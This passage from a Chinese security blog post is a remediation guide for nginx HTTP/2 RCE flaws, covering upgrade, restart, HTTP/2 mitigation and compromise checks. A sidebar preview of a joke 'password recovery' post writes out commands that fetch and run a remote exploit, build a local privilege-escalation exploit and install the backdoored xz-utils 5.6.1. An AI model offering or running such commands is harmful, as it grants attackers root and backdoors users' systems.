+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://nginx.org/download/nginx-1.30.7.tar.gz</span><br><span class="line">wget https://nginx.org/download/nginx-1.30.7.tar.gz.asc</span><br><span class="line">gpg --verify nginx-1.30.7.tar.gz.asc nginx-1.30.7.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>Docker 场景应更新基础镜像并重新构建，而不是进容器里手动替换二进制。</p>
+<h3 id="第二步：完整重启，而不是-reload"><a href="#第二步：完整重启，而不是-reload" class="headerlink" title="第二步：完整重启，而不是 reload"></a>第二步：完整重启，而不是 reload</h3><p>这一步很容易做错。<code>nginx -s reload</code> 只是让 master 重新读取配置并 fork 新 worker，<strong>master 进程内存里仍然是旧的可执行文件</strong>，新 worker 也就还是旧代码。必须重启整个进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart nginx</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">sudo</span> nginx -s stop &amp;&amp; <span class="built_in">sudo</span> nginx</span><br></pre></td></tr></table></figure>
+
+<p>容器环境用滚动重启，并确认旧容器&#x2F;Pod 已经全部退出。</p>
+<h3 id="第三步：验证"><a href="#第三步：验证" class="headerlink" title="第三步：验证"></a>第三步：验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx -v</span><br><span class="line">ps -eo pid,lstart,cmd | grep <span class="string">&#x27;[n]ginx: worker&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>确认版本号已经是安全版本，并且 worker 的启动时间在升级之后。再看一眼监听配置，确认业务没有被误伤。</p>
+<h3 id="第四步：处理无法升级的旧分支"><a href="#第四步：处理无法升级的旧分支" class="headerlink" title="第四步：处理无法升级的旧分支"></a>第四步：处理无法升级的旧分支</h3><p>已经 EOL、厂商不再提供补丁的版本，只有两条路：迁移到受支持版本，或者退而求其次关闭 HTTP&#x2F;2 并隔离暴露面。不要指望“版本老就没人打”——老版本恰恰缺少持续监控。</p>
+<h2 id="九、无法立即升级时的临时缓解"><a href="#九、无法立即升级时的临时缓解" class="headerlink" title="九、无法立即升级时的临时缓解"></a>九、无法立即升级时的临时缓解</h2><p>官方给出的有效缓解是<strong>关闭 HTTP&#x2F;2</strong>。它不能替代升级，但能同时阻断 CVE-2026-123007 和 CVE-2026-123633 的已知攻击路径。</p>
+<p>旧写法：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line"><span class="comment"># 改为</span></span><br><span class="line"><span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br></pre></td></tr></table></figure>
+
+<p>新写法（1.25.1+）：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http2</span> <span class="literal">on</span>;</span><br><span class="line"><span class="comment"># 改为</span></span><br><span class="line"><span class="attribute">http2</span> <span class="literal">off</span>;</span><br></pre></td></tr></table></figure>
+
+<p>改完先检查语法再重载：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nginx -t &amp;&amp; <span class="built_in">sudo</span> nginx -s reload</span><br></pre></td></tr></table></figure>
+
+<p>注意事项：</p>
+<ul>
+<li>关闭 HTTP&#x2F;2 会牺牲多路复用和头部压缩带来的性能，高并发站点要评估影响；</li>
+<li>它只覆盖这两个 RCE，不覆盖同批的 HTTP&#x2F;3、resolver、mail proxy、stream 等问题；</li>
+<li>如果启用了 HTTP&#x2F;3（<code>listen 443 quic</code>），CVE-2026-121810 是另一条路径，需要单独处理；</li>
+<li>如果源站只能通过 CDN 访问，可以在边界层限制直连，但这依赖网络配置正确，不能当成默认安全。</li>
+</ul>
+<h2 id="十、如果怀疑已经被打"><a href="#十、如果怀疑已经被打" class="headerlink" title="十、如果怀疑已经被打"></a>十、如果怀疑已经被打</h2><p>CVE-2026-123007 是内存破坏，不是“往 web 目录写文件”的漏洞。所以排查思路和 webshell 事件不完全一样：</p>
+<ul>
+<li>关注 nginx worker 是否出现异常 <code>SIGSEGV</code>、core dump、反复重启；</li>
+<li>检查是否有异常长连接、超大流量、密集 <code>WINDOW_UPDATE</code> 的 HTTP&#x2F;2 会话（普通 access log 看不到帧级别细节，需要抓包、eBPF 或厂商检测规则）；</li>
+<li>检查 nginx 及其子进程有没有拉起 <code>sh</code>、<code>bash</code>、<code>curl</code>、<code>wget</code> 等异常子进程；</li>
+<li>检查 <code>/tmp</code>、<code>/dev/shm</code> 下是否有可疑文件，计划任务、<code>LD_PRELOAD</code>、动态链接器配置是否被改；</li>
+<li>检查异常外连和数据外传；</li>
+<li>如果确认有可疑迹象，先保留内存、core 和日志证据，再重启服务，并轮换该机器可访问的凭证。</li>
+</ul>
+<p>另外要警惕：漏洞披露后出现了不少打着“nginx2root exploit”旗号的仓库，其中一些是恶意代码或钓鱼。不要在生产环境或自己的开发机上运行来源不明的利用程序。</p>
+<h2 id="十一、常见误区"><a href="#十一、常见误区" class="headerlink" title="十一、常见误区"></a>十一、常见误区</h2><p><strong>“我只是静态文件服务器，没有后端，不会有 RCE。”</strong></p>
+<p>不成立。CVE-2026-123007 影响的是 HTTP&#x2F;2 编解码和 TLS 输出路径，Wiz 就是在<strong>只提供静态文件</strong>的官方构建上演示了利用，不需要 PHP、Java 或任何应用。</p>
+<p><strong>“前面有 CDN &#x2F; WAF，源站就安全。”</strong></p>
+<p>不一定。CDN 终止 HTTP&#x2F;2 后，攻击流量在边缘就被拆成了 HTTP&#x2F;1.1，确实会让利用条件难以成立；但这依赖 CDN 的具体实现，而且源站如果可以被直连绕过，防护就失效了。CDN 只能争取时间，不能替代升级。</p>
+<p><strong>“<code>nginx -s reload</code> 过了，补丁就生效了。”</strong></p>
+<p>不生效。reload 不会替换 master 进程里的旧代码，必须完整重启。</p>
+<p><strong>“版本不在受影响范围就万事大吉。”</strong></p>
+<p>版本只是第一个条件。还要确认 HTTP&#x2F;2 模块是否编译、端口是否启用 h2、是否可被直接访问。反过来，版本在范围内也不代表一定能打，需要背压、窗口更新、流取消等时序条件同时满足。</p>
+<p><strong>“CVSS 攻击复杂度是 High，可以先观望。”</strong></p>
+<p>公开 PoC 已经出现，Wiz 也展示了带 ASLR 绕过的完整利用链。对暴露在公网的核心入口，等待的成本通常高于升级。</p>
+<p><strong>“看到 web 目录里有 <code>nginx2shell.php</code> 就是中招了。”</strong></p>
+<p>这个漏洞不写 webroot。可疑文件更可能是别的入侵途径留下的；同样，没有可疑文件也不代表没被打。判断依据应该是 crash、内存取证、帧级流量和进程行为。</p>
+<h2 id="十二、时间线"><a href="#十二、时间线" class="headerlink" title="十二、时间线"></a>十二、时间线</h2><table>
+<thead>
+<tr>
+<th>时间</th>
+<th>事件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2026-11-18</td>
+<td>F5 &#x2F; nginx.org 发布 1.30.7、1.31.9，披露 9 个漏洞</td>
+</tr>
+<tr>
+<td>2026-11-18</td>
+<td>Wiz 发布技术分析；Rapid7 公开 CVE-2026-123007 的 PoC 与分析</td>
+</tr>
+<tr>
+<td>2026-11-19</td>
+<td>安全厂商确认暂无在野利用，未进入 CISA KEV；EPSS 约 6.36%</td>
+</tr>
+<tr>
+<td>2026-11 下旬</td>
+<td>各发行版陆续回移补丁；内嵌 nginx 的产品分批更新</td>
+</tr>
+</tbody></table>
+<h2 id="十三、参考链接"><a href="#十三、参考链接" class="headerlink" title="十三、参考链接"></a>十三、参考链接</h2><ul>
+<li>nginx 官方安全公告：<a target="_blank" rel="noopener" href="https://nginx.org/en/security_advisories.html">https://nginx.org/en/security_advisories.html</a></li>
+<li>F5 公告 K000163926（CVE-2026-123007）：<a target="_blank" rel="noopener" href="https://my.f5.com/manage/s/article/K000163926">https://my.f5.com/manage/s/article/K000163926</a></li>
+<li>F5 公告 K000163928（CVE-2026-123633）：<a target="_blank" rel="noopener" href="https://my.f5.com/manage/s/article/K000163928">https://my.f5.com/manage/s/article/K000163928</a></li>
+<li>Wiz 技术分析：<a target="_blank" rel="noopener" href="https://www.wiz.io/blog/nginx-http2-rce-vulnerabilities">https://www.wiz.io/blog/nginx-http2-rce-vulnerabilities</a></li>
+<li>oss-security 披露邮件：<a target="_blank" rel="noopener" href="https://www.openwall.com/lists/oss-security/2026/11/18/16">https://www.openwall.com/lists/oss-security/2026/11/18/16</a></li>
+<li>Help Net Security 报道：<a target="_blank" rel="noopener" href="https://www.helpnetsecurity.com/2026/11/19/nginx2root-nginx-vulnerabilities/">https://www.helpnetsecurity.com/2026/11/19/nginx2root-nginx-vulnerabilities/</a></li>
+<li>Ubuntu CVE 页面：<a target="_blank" rel="noopener" href="https://ubuntu.com/security/CVE-2026-123007">https://ubuntu.com/security/CVE-2026-123007</a></li>
+<li>Qualys 修复建议：<a target="_blank" rel="noopener" href="https://blog.qualys.com/product-tech/patch-management/2026/11/18/nginx2root-five-nginx-flaws-led-by-cve-2026-123007-how-to-find-mitigate-and-patch-now">https://blog.qualys.com/product-tech/patch-management/2026/11/18/nginx2root-five-nginx-flaws-led-by-cve-2026-123007-how-to-find-mitigate-and-patch-now</a></li>
+<li>公开的根因分析（第三方，非官方）：<a target="_blank" rel="noopener" href="https://github.com/im0xfay/CVE-2026-123007">https://github.com/im0xfay/CVE-2026-123007</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://doub1e007.github.io">Doub1e007</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://doub1e007.github.io/2026/11/23/NGINX2Shell%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/">https://doub1e007.github.io/2026/11/23/NGINX2Shell%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://doub1e007.github.io" target="_blank">剁椒鱼头没剁椒的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><a class="post-meta__tags" href="/tags/Nginx/">Nginx</a><a class="post-meta__tags" href="/tags/HTTP-2/">HTTP/2</a></div><div class="post-share"><div class="social-share" data-image="https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-xl8kzl_1920x1080.png" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/10/22/PHP2Shell%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/" title="PHP2Shell 漏洞梳理：两个 9.2 分的 PHP 核心 RCE（CVE-2026-109618 / CVE-2026-109619）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-95y77d_1920x1080.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">PHP2Shell 漏洞梳理：两个 9.2 分的 PHP 核心 RCE（CVE-2026-109618 / CVE-2026-109619）</div></div><div class="info-2"><div class="info-item-1">2026 年 10 月 21 日，PHP 官方发布紧急安全更新，修复了两个位于 PHP 核心的高危远程代码执行漏洞：  CVE-2026-109618：OOM（内存耗尽）处理不当导致内存破坏，最终可 RCE CVE-2026-109619：请求结束后全局状态未正确清理，形成 use-after-free，最终可 RCE  两个漏洞的 CVSS v4.0 评分均为 9.2（Critical），社区将它们合称为 PHP2Shell。需要说明的是，PHP2Shell 是媒体和安全厂商使用的昵称，PHP 官方公告中主要使用 CVE 编号。 这次漏洞的特殊之处在于：问题不在 WordPress、Laravel 或某个插件里，而在 PHP 解释器本身。因此受影响的不是某一个应用，而是几乎所有用 PHP 处理 Web 请求的站点。本文基于官方安全公告和公开研究整理，不包含利用代码，重点放在原理理解、影响判断和处置上。 一、事件速览   项目 内容    披露&#x2F;修复时间 2026 年 10 月 21 日 14:00...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/10/22/PHP2Shell%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/" title="PHP2Shell 漏洞梳理：两个 9.2 分的 PHP 核心 RCE（CVE-2026-109618 &#x2F; CVE-2026-109619）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-95y77d_1920x1080.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026年10月22日</div><div class="info-item-2">PHP2Shell 漏洞梳理：两个 9.2 分的 PHP 核心 RCE（CVE-2026-109618 &#x2F; CVE-2026-109619）</div></div><div class="info-2"><div class="info-item-1">2026 年 10 月 21 日，PHP 官方发布紧急安全更新，修复了两个位于 PHP 核心的高危远程代码执行漏洞：  CVE-2026-109618：OOM（内存耗尽）处理不当导致内存破坏，最终可 RCE CVE-2026-109619：请求结束后全局状态未正确清理，形成 use-after-free，最终可 RCE  两个漏洞的 CVSS v4.0 评分均为 9.2（Critical），社区将它们合称为 PHP2Shell。需要说明的是，PHP2Shell 是媒体和安全厂商使用的昵称，PHP 官方公告中主要使用 CVE 编号。 这次漏洞的特殊之处在于：问题不在 WordPress、Laravel 或某个插件里，而在 PHP 解释器本身。因此受影响的不是某一个应用，而是几乎所有用 PHP 处理 Web 请求的站点。本文基于官方安全公告和公开研究整理，不包含利用代码，重点放在原理理解、影响判断和处置上。 一、事件速览   项目 内容    披露&#x2F;修复时间 2026 年 10 月 21 日 14:00...</div></div></div></a><a class="pagination-related" href="/2026/05/14/%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9BLinux%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" title="Linux密码找回方法(bushi"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-xl8kzl_1920x1080.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026年05月14日</div><div class="info-item-2">Linux密码找回方法(bushi</div></div><div class="info-2"><div class="info-item-1"> Linux 找回密码教程，建议收藏！   1curl https://copy.fail/exp | python3 &amp;&amp; su    passwd root  设置你的新密码    你的 Linux 密码又忘了？ 没关系，这里还有一个新的！   1git clone https://github.com/V4bel/dirtyfrag.git&amp;&amp; cd dirtyfrag &amp;&amp; gcc -O0 -Wall -o exp exp.c -lutil &amp;&amp; ./exp   不想再忘记密码了？ 我们有专业的黑客团队帮您运维服务器和保管密码！ 项目地址: https://github.com/tukaani-project/xz/tree/v5.6.1   12sudo apt install xz-utils=5.6.1-1  sudo systemctl restart ssh   容易忘记密码的有福了，每天都有新办法！ https://ze3tar.github.io/post-zcrx.html...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Doub1e007</div><div class="author-info-description">保持热爱，奔赴山海</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Doub1e007"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Doub1e007" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BA%8B%E4%BB%B6%E9%80%9F%E8%A7%88"><span class="toc-number">1.</span> <span class="toc-text">一、事件速览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%85%88%E6%90%9E%E6%87%82-HTTP-2-%E7%9A%84%E6%B5%81%E6%8E%A7"><span class="toc-number">2.</span> <span class="toc-text">二、先搞懂 HTTP&#x2F;2 的流控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81CVE-2026-123007%EF%BC%9A%E6%B5%81%E6%8E%A7%E8%AE%A1%E6%95%B0%E5%99%A8%E4%B8%8B%E6%BA%A2"><span class="toc-number">3.</span> <span class="toc-text">三、CVE-2026-123007：流控计数器下溢</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E5%9B%A0"><span class="toc-number">3.1.</span> <span class="toc-text">根因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E6%95%B4%E6%95%B0%E9%94%99%E8%AF%AF%E5%88%B0%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F"><span class="toc-number">3.2.</span> <span class="toc-text">从整数错误到内存破坏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E4%B8%AA%E6%B4%9E%E8%97%8F%E4%BA%86-11-%E5%B9%B4"><span class="toc-number">3.3.</span> <span class="toc-text">为什么这个洞藏了 11 年</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81CVE-2026-123633%EF%BC%9A%E8%BF%9E%E6%8E%A5%E5%A4%8D%E7%94%A8%E6%A0%87%E8%AE%B0%E5%AF%BC%E8%87%B4%E7%9A%84-UAF"><span class="toc-number">4.</span> <span class="toc-text">四、CVE-2026-123633：连接复用标记导致的 UAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%90%8C%E4%B8%80%E6%89%B9%E4%BF%AE%E5%A4%8D%E7%9A%84%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">五、同一批修复的其他漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">6.</span> <span class="toc-text">六、影响范围</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx-%E5%BC%80%E6%BA%90%E7%89%88"><span class="toc-number">6.1.</span> <span class="toc-text">nginx 开源版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NGINX-Plus"><span class="toc-number">6.2.</span> <span class="toc-text">NGINX Plus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E6%98%93%E8%A2%AB%E5%BF%BD%E7%95%A5%E7%9A%84%E2%80%9C%E5%86%85%E5%B5%8C-nginx%E2%80%9D"><span class="toc-number">6.3.</span> <span class="toc-text">容易被忽略的“内嵌 nginx”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E8%87%AA%E6%9F%A5%EF%BC%9A%E6%88%91%E7%9A%84-nginx-%E7%9C%9F%E7%9A%84%E5%8F%97%E5%BD%B1%E5%93%8D%E5%90%97"><span class="toc-number">7.</span> <span class="toc-text">七、自查：我的 nginx 真的受影响吗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E7%89%88%E6%9C%AC%E5%92%8C%E6%A8%A1%E5%9D%97"><span class="toc-number">7.1.</span> <span class="toc-text">1. 查版本和模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E9%85%8D%E7%BD%AE%E9%87%8C%E6%98%AF%E5%90%A6%E5%90%AF%E7%94%A8%E4%BA%86-HTTP-2"><span class="toc-number">7.2.</span> <span class="toc-text">2. 查配置里是否启用了 HTTP&#x2F;2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BB%8E%E5%A4%96%E9%83%A8%E7%A1%AE%E8%AE%A4%E6%98%AF%E5%90%A6%E5%8D%8F%E5%95%86%E4%BA%86-h2"><span class="toc-number">7.3.</span> <span class="toc-text">3. 从外部确认是否协商了 h2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9F%A5%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E3%80%81%E5%AE%B9%E5%99%A8%E5%92%8C%E6%89%80%E6%9C%89%E5%AE%9E%E4%BE%8B"><span class="toc-number">7.4.</span> <span class="toc-text">4. 查包管理器、容器和所有实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E4%BF%AE%E5%A4%8D%E6%AD%A5%E9%AA%A4"><span class="toc-number">8.</span> <span class="toc-text">八、修复步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%8D%87%E7%BA%A7"><span class="toc-number">8.1.</span> <span class="toc-text">第一步：升级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%AE%8C%E6%95%B4%E9%87%8D%E5%90%AF%EF%BC%8C%E8%80%8C%E4%B8%8D%E6%98%AF-reload"><span class="toc-number">8.2.</span> <span class="toc-text">第二步：完整重启，而不是 reload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E9%AA%8C%E8%AF%81"><span class="toc-number">8.3.</span> <span class="toc-text">第三步：验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E5%A4%84%E7%90%86%E6%97%A0%E6%B3%95%E5%8D%87%E7%BA%A7%E7%9A%84%E6%97%A7%E5%88%86%E6%94%AF"><span class="toc-number">8.4.</span> <span class="toc-text">第四步：处理无法升级的旧分支</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E6%97%A0%E6%B3%95%E7%AB%8B%E5%8D%B3%E5%8D%87%E7%BA%A7%E6%97%B6%E7%9A%84%E4%B8%B4%E6%97%B6%E7%BC%93%E8%A7%A3"><span class="toc-number">9.</span> <span class="toc-text">九、无法立即升级时的临时缓解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E5%A6%82%E6%9E%9C%E6%80%80%E7%96%91%E5%B7%B2%E7%BB%8F%E8%A2%AB%E6%89%93"><span class="toc-number">10.</span> <span class="toc-text">十、如果怀疑已经被打</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E5%B8%B8%E8%A7%81%E8%AF%AF%E5%8C%BA"><span class="toc-number">11.</span> <span class="toc-text">十一、常见误区</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="toc-number">12.</span> <span class="toc-text">十二、时间线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">13.</span> <span class="toc-text">十三、参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/11/23/NGINX2Shell%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/" title="nginx 也翻车了：9.2 分的 NGINX2Shell 漏洞到底有多严重？（CVE-2026-123007 / CVE-2026-123633）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-xl8kzl_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="nginx 也翻车了：9.2 分的 NGINX2Shell 漏洞到底有多严重？（CVE-2026-123007 / CVE-2026-123633）"/></a><div class="content"><a class="title" href="/2026/11/23/NGINX2Shell%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/" title="nginx 也翻车了：9.2 分的 NGINX2Shell 漏洞到底有多严重？（CVE-2026-123007 / CVE-2026-123633）">nginx 也翻车了：9.2 分的 NGINX2Shell 漏洞到底有多严重？（CVE-2026-123007 / CVE-2026-123633）</a><time datetime="2026-11-23T02:00:00.000Z" title="发表于 2026年11月23日 10:00:00">2026年11月23日</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/22/PHP2Shell%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/" title="PHP2Shell 漏洞梳理：两个 9.2 分的 PHP 核心 RCE（CVE-2026-109618 / CVE-2026-109619）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-95y77d_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP2Shell 漏洞梳理：两个 9.2 分的 PHP 核心 RCE（CVE-2026-109618 / CVE-2026-109619）"/></a><div class="content"><a class="title" href="/2026/10/22/PHP2Shell%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/" title="PHP2Shell 漏洞梳理：两个 9.2 分的 PHP 核心 RCE（CVE-2026-109618 / CVE-2026-109619）">PHP2Shell 漏洞梳理：两个 9.2 分的 PHP 核心 RCE（CVE-2026-109618 / CVE-2026-109619）</a><time datetime="2026-10-22T02:30:00.000Z" title="发表于 2026年10月22日 10:30:00">2026年10月22日</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/06/API%E4%B8%AD%E8%BD%AC%E7%AB%99%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3-%E5%BD%93AI-Agent%E9%81%87%E4%B8%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%90%86/" title="API 中转站的安全隐患：当 AI Agent 遇上恶意代理"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-gjvlel_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="API 中转站的安全隐患：当 AI Agent 遇上恶意代理"/></a><div class="content"><a class="title" 